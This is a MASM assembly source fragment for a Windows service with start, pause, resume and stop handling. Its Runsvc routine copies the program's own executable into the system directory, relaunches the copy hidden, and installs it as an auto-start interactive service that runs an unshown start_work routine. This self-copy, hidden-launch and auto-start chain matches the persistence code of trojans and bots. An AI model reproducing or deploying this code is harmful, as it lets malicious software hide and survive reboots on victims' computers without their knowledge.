.data
fPaused BOOL FALSE
fRunning BOOL FALSE
.data?
exitEvent	dd	?
hWinMain	dd	?
schSCManager dd	?
szFileName              db      MAX_PATH+1 dup(?)
stSS		SERVICE_STATUS	<>
hStatus DWORD ?
sTable SERVICE_TABLE_ENTRY <>
sTable2 SERVICE_TABLE_ENTRY <>
hInstance HINSTANCE ?
hThread HANDLE ?
evTerminate HANDLE ?

.code
IsInstalledService proc

        invoke  OpenSCManager, NULL, NULL, SC_MANAGER_ALL_ACCESS
        mov     schSCManager, eax
        .IF     !eax
                ret
        .ENDIF
        invoke  OpenService, schSCManager, offset szServiceName, DELETE
        .IF     eax
                invoke  CloseServiceHandle, eax
                push    1
        .ELSE
                push    0
        .ENDIF
        invoke  CloseServiceHandle, schSCManager
        pop     eax
        ret
IsInstalledService endp

InstallService	proc
        invoke  OpenSCManager, NULL, NULL, SC_MANAGER_ALL_ACCESS
        mov     schSCManager, eax
        .IF     !eax
                ret
        .ENDIF
 invoke  GetModuleFileName, 0, addr szFileName, MAX_PATH
		invoke	CreateService,schSCManager,addr szServiceName,addr szDisplayName,\
			SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS or SERVICE_INTERACTIVE_PROCESS,\
			SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,addr szFileName,\
			NULL,NULL,NULL,NULL,NULL
        .IF     eax
                push    eax
                invoke  StartService, eax, NULL, NULL
                call    CloseServiceHandle
        .ENDIF
        invoke  CloseServiceHandle, schSCManager
		ret
InstallService	endp
InitService Proc
  LOCAL id:DWORD
  mov fRunning, TRUE
  mov eax, 1
  ret
InitService EndP

ResumeService Proc
  mov fPaused, FALSE
  invoke ResumeThread, hThread
  ret
ResumeService EndP

PauseService Proc
  mov fPaused, TRUE
  invoke SuspendThread, hThread
  ret
PauseService EndP

StopServiceStatus Proc
  mov fRunning, FALSE
  ; This will release ServiceMain
  invoke SendMessage,hWinMain,WM_CLOSE,0,0
  invoke SetEvent, evTerminate
  ret
StopServiceStatus EndP

CtrlHandler Proc controlCode1:DWORD
  LOCAL currentState:DWORD
  LOCAL success:BOOL

  mov currentState, 0
  mov eax, controlCode1

  .if ( eax == SERVICE_CONTROL_STOP )
	SendSvcState SERVICE_STOP_PENDING
    call StopServiceStatus
	SendSvcState SERVICE_STOPPED
  .elseif ( eax == SERVICE_CONTROL_PAUSE )
    .if ( fRunning != FALSE && fPaused == FALSE )
		SendSvcState SERVICE_PAUSE_PENDING

		call PauseService
      
		SendSvcState SERVICE_PAUSED
    .endif

  .elseif ( eax == SERVICE_CONTROL_CONTINUE )
    .if ( fRunning != FALSE && fPaused == TRUE )
   		SendSvcState SERVICE_CONTINUE_PENDING

		call ResumeService

   		SendSvcState SERVICE_RUNNING
    .endif

  .elseif ( eax == SERVICE_CONTROL_INTERROGATE )
  .elseif ( eax == SERVICE_CONTROL_SHUTDOWN )
  .endif
  ret
CtrlHandler EndP

ServiceMain Proc argc:DWORD, argv:DWORD

	invoke	RegisterServiceCtrlHandler,addr szServiceName,offset CtrlHandler
	mov hStatus, eax
	mov	stSS.dwServiceType,SERVICE_WIN32_OWN_PROCESS or SERVICE_INTERACTIVE_PROCESS
	mov	stSS.dwControlsAccepted,SERVICE_ACCEPT_STOP
	mov	stSS.dwWin32ExitCode,NO_ERROR
	mov stSS.dwWaitHint,3000
	SendSvcState SERVICE_START_PENDING
  call InitService
  SendSvcState SERVICE_RUNNING
  invoke  start_work
  ret
ServiceMain EndP

Runsvc proc
        invoke  GetSystemDirectory, offset lpBuf1, MAX_PATH+1

        invoke  GetModuleFileName, NULL, offset lpBuf2, MAX_PATH+1


        invoke  lstrcat, offset lpBuf1, offset exename

        invoke  lstrcmp, offset lpBuf1, offset lpBuf2
        test    eax, eax
        jz      @ret ; running from windows directory, do nothing

        invoke  CopyFile, offset lpBuf2, offset lpBuf1, 0
        test    eax, eax
        jz      @exit ; file cannot be copied: it's running already
  
        invoke  lstrlen, offset lpBuf1

@@:
        invoke  ShellExecute, 0, offset szTextOpen, offset lpBuf1, 0, 0, SW_HIDE

@exit:
        invoke  ExitProcess, 0
@ret:
	invoke  IsInstalledService
	.IF     !eax
		invoke  InstallService
	.ENDIF
  mov sTable.lpServiceProc, offset ServiceMain
  mov sTable.lpServiceName, offset szServiceName
  invoke StartServiceCtrlDispatcher, addr sTable
        ret
Runsvc endp
